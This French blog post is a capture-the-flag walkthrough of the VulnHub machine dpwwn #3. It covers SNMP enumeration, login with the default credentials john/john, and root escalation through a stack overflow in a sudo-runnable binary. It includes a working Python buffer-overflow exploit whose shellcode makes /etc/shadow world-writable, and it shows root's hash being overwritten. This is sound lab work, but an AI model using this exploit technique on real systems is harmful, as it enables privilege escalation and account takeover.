---
title: "Solution du CTF dpwwn #3 de VulnHub"
tags: [CTF, VulnHub, binary exploitation]
---

[dpwwn: 3](https://vulnhub.com/entry/dpwwn-3,345/) téléchargeable sur *VulnHub* a été un CTF particulier. Faute d'attention de ma part l'escalade de privilège m'a pris plus de temps que ce que j'imaginais, mais finalement, c'était plutôt intéressant.

La mise en place de la VM a été un peu compliquée, car elle ne prenait pas correctement son adresse DHCP et l'accès à GRUB semblait impossible. Il a donc fallu monter le disque virtuel comme sur le [CTF Holynix]({% link _posts/2022-12-04-Solution-du-CTF-Holynix-1-de-VulnHub.md %}).

## L'autre scan

Un scan de port ne révèle pas grande matière pour travailler, mais on a quand même un indice avec le port TCP 161 qui n'est pas filtré.

```
Nmap scan report for 192.168.56.189
Host is up (0.00048s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.9p1: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|_      PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
161/tcp closed snmp
```

Ce numéro de port correspond habituellement à SNMP mais en UDP. C'est certainement un indice pour qu'on aille voir de ce côté.

```console
$ sudo nmap -sU -T5 192.168.56.189
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 14:50 CEST
Nmap scan report for 192.168.56.189
Host is up (0.00064s latency).
Not shown: 998 open|filtered udp ports (no-response)
PORT    STATE  SERVICE
22/udp  closed ssh
161/udp open   snmp
```

Les scripts Lua de Nmap n'ont pas donné grand-chose donc je me suis tourné vers `snmpwalk` :

```console
$ snmpwalk -v 1 -c public 192.168.56.189
SNMPv2-MIB::sysDescr.0 = STRING: Linux dpwwn-03 4.19.0-5-686-pae #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) i686
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (67925) 0:11:19.25
SNMPv2-MIB::sysContact.0 = STRING: john <john@dpwwn-03>
SNMPv2-MIB::sysName.0 = STRING: dpwwn-03
SNMPv2-MIB::sysLocation.0 = STRING: john room
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORID.1 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.8 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.2 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.3 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (2) 0:00:00.02
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (68356) 0:11:23.56
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2023-4-29,8:59:23.0,-4:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-4.19.0-5-686-pae root=UUID=c7e8252b-ff79-48c0-8312-4f5f45e4d724 ro quiet
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 1
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 62
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
End of MIB
```

À première vue pas grand-chose d'intéressant. J'ai tenté d'en obtenir davantage en me basant sur [Pentesting SNMP - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp) mais je n'ai pas avancé plus.

Finalement il fallait simplement se connecter sur le SSH avec les identifiants `john` / `john`.

## L'autre randomisation

Ce dernier a le droit d'exécuter un script bash particulier avec le compte root :

```console
john@dpwwn-03:~$ sudo -l
Matching Defaults entries for john on dpwwn-03:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on dpwwn-03:
    (root) NOPASSWD: /bin/sh /home/ss.sh
john@dpwwn-03:~$ ls
Hello_john.txt  smashthestack
```

Le script bash lance un binaire ELF mais pas celui qui est dans `/home/john`. Il s'agit toutefois d'une copie exacte, mais dans `/home` pour éviter toute altération du fichier.

```console
john@dpwwn-03:~$ cat /home/ss.sh 
#!/bin/sh
SHELL=/bin/bash
PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home'

/home/./smashthestack &
```

Comme on s'en doute aucune permission trop ouverte n'est présente :

```console
john@dpwwn-03:~$ ls -al /home/
total 36
drwxr-xr-x  3 root root  4096 Aug 12  2019 .
drwxr-xr-x 18 root root  4096 Aug 10  2019 ..
drwxr-xr-x  3 john john  4096 Apr 29 09:04 john
-rwxr-xr-x  1 root root 19824 Aug 12  2019 smashthestack
-rwxr-xr-x  1 root root   123 Aug 12  2019 ss.sh
```

Si on lance le programme directement il est assez verbeux pour nous dire ce qu'il fait :

```console
john@dpwwn-03:~$ ./smashthestack
Thank you for run this program  
Welcome to Echo System 
Check this system TCP port 3210
```

Un coup d'œil dans `Cutter`  nous amène rapidement à une fonction au nom équivoque avec un appel à `strcpy`.

```nasm
dbg.vulncode (int stack1, char *reply);
; var char [720] result @ stack - 0x2dc
; var int32_t var_8h @ stack - 0x8
; arg int stack1 @ stack + 0x4
; arg char *reply @ stack + 0x8
0x00001259      push    ebp        ; smashthestack.c:11 ; int vulncode(int stack1,char * reply);
0x0000125a      mov     ebp, esp
0x0000125c      push    ebx
0x0000125d      sub     esp, 0x2d4
0x00001263      call    __x86.get_pc_thunk.ax ; sym.__x86.get_pc_thunk.ax
0x00001268      add     eax, 0x2d98
0x0000126d      sub     esp, 8     ; smashthestack.c:13
0x00001270      push    dword [reply] ; const char *src
0x00001273      lea     edx, [result[0]]
0x00001279      push    edx        ; char *dest
0x0000127a      mov     ebx, eax
0x0000127c      call    strcpy     ; sym.imp.strcpy ; char *strcpy(char *dest, const char *src)
0x00001281      add     esp, 0x10
0x00001284      mov     eax, 0     ; smashthestack.c:14
0x00001289      mov     ebx, dword [var_8h] ; smashthestack.c:15
0x0000128c      leave
0x0000128d      ret
```

On peut voir que 724 octets sont réservés sur la stack frame pour les variables locales.

Le binaire n'a ni stack protector ni les canary :

```console
$ checksec --file smashthestack 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   /tmp/smashthestack
```

J'ai balancé sur chaine cyclique sur l'exécutable que je déboguais en local :

```console
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x68616167 ('gaah')
ECX: 0xffffcb60 --> 0x1 
EDX: 0xffffc870 --> 0x63610001 
ESI: 0x56556400 (<__libc_csu_init>:     push   ebp)
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x68616168 ('haah')
ESP: 0xffffc74c ("iaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaaj"...)
EIP: 0x5655628d (<vulncode+52>: ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556284 <vulncode+43>:    mov    eax,0x0
   0x56556289 <vulncode+48>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x5655628c <vulncode+51>:    leave  
=> 0x5655628d <vulncode+52>:    ret    
   0x5655628e <main>:   lea    ecx,[esp+0x4]
   0x56556292 <main+4>: and    esp,0xfffffff0
   0x56556295 <main+7>: push   DWORD PTR [ecx-0x4]
   0x56556298 <main+10>:        push   ebp
[------------------------------------stack-------------------------------------]
0000| 0xffffc74c ("iaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaaj"...)
```

Ainsi j'ai calculé qu'il fallait 732 octets avant l'écrasement de `eip`.

J'ai cherché un gadget dans le binaire pour sauter sur `esp`. Il n'y avait rien de tel mais j'ai trouvé un équivalent :

```nasm
gdb-peda$ x/20i _start+48
   0x56556150 <_start+48>:      push   esp
   0x56556152 <_start+50>:      mov    ebx,DWORD PTR [esp]
   0x56556155 <_start+53>:      ret
```

Tout semblait donc aller pour le mieux dans le meilleur des mondes... sauf qu'à chaque tentative d'exploitation le binaire segfaultait (future entrée du dictionnaire ?) sans donner le moindre shell... Sauf (bien sûr) si il tournait depuis GDB.

J'ai mis du temps à comprendre ce qu'il se passait, mais les lecteurs attentifs auront remarqué la présence de `PIE enabled` dans l'output de `checksec` plus haut.

Cela signifie que les adresses des instructions sont randomisées et par conséquence notre gadget n'a jamais la même adresse.

Ceci dit, le système est en 32 bits donc on pourrait se permettre de bruteforcer cette adresse comme je l'avais fait sur le [CTF Xerxes #2]({% link _posts/2014-08-14-Solution-du-CTF-Xerxes-2.md %}#exploitation-de-la-chaine-de-format-1er-cas--brute-force-aslr) ou encore simplement désactiver la randomisation avec `ulimit`. Tout ça est de la théorie, car les détails de l'implémentation de `PIE` (*position-independent executable*) me sont inconnus.

Ce que je vois en revanche, c'est que la stack n'est pas randomisée :

```console
john@dpwwn-03:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

Par conséquent, on peut faire pointer l'adresse de retour vers un shellcode présent sur la stack. Toutefois l'utilisation de sudo (qui fait un reset d'environnement par défaut) ne nous permettra pas de placer un shellcode dans l'environnement.

L'idée est de profiter de l'espace présent avant l'adresse de retour pour placer un shellcode avec un gros nopsled. On peut même en placer après. Si on a une idée approximative de l'adresse de ce nopsled alors on pourra l'utiliser comme adresse de retour... à l'ancienne.

Ici j'ai envoyé `0xdeadbeef` comme adresse de retour avec des NOP (`0x90`) avant et après.

```console
john@dpwwn-03:~$ gdb -q /home/./smashthestack
Reading symbols from /home/./smashthestack...done.
(gdb) b main
Breakpoint 1 at 0x12ae: file smashthestack.c, line 21.
(gdb) r
Starting program: /home/smashthestack 

Breakpoint 1, main (argc=1, argv=0xbffff714) at smashthestack.c:21
21      smashthestack.c: No such file or directory.
(gdb) disass bulncode
No symbol "bulncode" in current context.
(gdb) disass bulncode
No symbol "bulncode" in current context.
(gdb) disass vulncode
Dump of assembler code for function vulncode:
   0x00401259 <+0>:     push   %ebp
   0x0040125a <+1>:     mov    %esp,%ebp
   0x0040125c <+3>:     push   %ebx
   0x0040125d <+4>:     sub    $0x2d4,%esp
   0x00401263 <+10>:    call   0x4013f8 <__x86.get_pc_thunk.ax>
   0x00401268 <+15>:    add    $0x2d98,%eax
   0x0040126d <+20>:    sub    $0x8,%esp
   0x00401270 <+23>:    pushl  0xc(%ebp)
   0x00401273 <+26>:    lea    -0x2d8(%ebp),%edx
   0x00401279 <+32>:    push   %edx
   0x0040127a <+33>:    mov    %eax,%ebx
   0x0040127c <+35>:    call   0x401080 <strcpy@plt>
   0x00401281 <+40>:    add    $0x10,%esp
   0x00401284 <+43>:    mov    $0x0,%eax
   0x00401289 <+48>:    mov    -0x4(%ebp),%ebx
   0x0040128c <+51>:    leave  
   0x0040128d <+52>:    ret    
End of assembler dump.
(gdb) b *0x0040128d
Breakpoint 2 at 0x40128d: file smashthestack.c, line 15.
(gdb) c
Continuing.
Thank you for run this program  
Welcome to Echo System 
Check this system TCP port 3210

Breakpoint 2, 0x0040128d in vulncode (stack1=2573, reply=0xbffff230 '\220' <repeats 200 times>...) at smashthestack.c:15
15      in smashthestack.c
(gdb) x/wx $esp
0xbffff21c:     0xdeadbeef
(gdb) x/wx $esp-732
0xbfffef40:     0x90909090
```

Donc `0xbfffef40` va nous servir de référence. Comme sur les exploits d'il y a 2 / 3 décennies, on va écrire un exploit qui accepte un offset pour corriger l'adresse :

```python
import sys
from socket import socket
from struct import pack

offset = int(sys.argv[1])
shellcode_addr = 0xbfffef40+offset

# https://www.exploit-db.com/shellcodes/13392
# (linux/x86) chmod("/etc/shadow", 0666) + exit() - 32 bytes
shellcode = (
    b"\x6a\x0f"               #  push $0xf
    b"\x58"                   #  pop %eax
    b"\x31\xc9"               #  xor %ecx,%ecx
    b"\x51"                   #  push %ecx
    b"\x66\xb9\xb6\x01"       #  mov $0x1b6,%cx
    b"\x68\x61\x64\x6f\x77"   #  push $0x776f6461
    b"\x68\x63\x2f\x73\x68"   #  push $0x68732f63
    b"\x68\x2f\x2f\x65\x74"   #  push $0x74652f2f
    b"\x89\xe3"               #  mov %esp,%ebx
    b"\xcd\x80"               #  int $0x80
    b"\x40"                   #  inc %eax
    b"\xcd\x80"               #  int $0x80
)

payload = b"\x90" * (732 - len(shellcode)) + shellcode + pack("<I", shellcode_addr)
payload += b"\r\n"

sock = socket()
sock.connect(("127.0.0.1", 3210))
sock.send(payload)
sock.close()
```

Avec un offset de 300 octets, c'est passé :

```console
john@dpwwn-03:~$ ls -al /etc/shadow
-rw-r----- 1 root shadow 972 Aug 10  2019 /etc/shadow
john@dpwwn-03:~$ python3 exploit.py 300
john@dpwwn-03:~$ ls -al /etc/shadow
-rw-rw-rw- 1 root shadow 972 Aug 10  2019 /etc/shadow
john@dpwwn-03:~$ vi /etc/shadow
john@dpwwn-03:~$ su root
Password: 
root@dpwwn-03:/home/john# id
uid=0(root) gid=0(root) groups=0(root)
root@dpwwn-03:/home/john# cd /root
root@dpwwn-03:~# ls
dpwwn-03-FLAG.txt
root@dpwwn-03:~# cat dpwwn-03-FLAG.txt

Congratulation !!! Hope you enjoy this smash the stack.

722f7322 
3852277a 
6165327a 
364c4022 
3b5a2959 
3e235051 
7e3e7d3b 
48365577 
787d286e 
6d754350 
58405d3b 
3d6e3b42 
7645909
```

Le shellcode se charge de rendre le fichier `/etc/shadow` modifiable. J'ai alors recopié le hash de l'utilisateur `john` dont je connais le mot de passe pour l'appliquer à `root`.
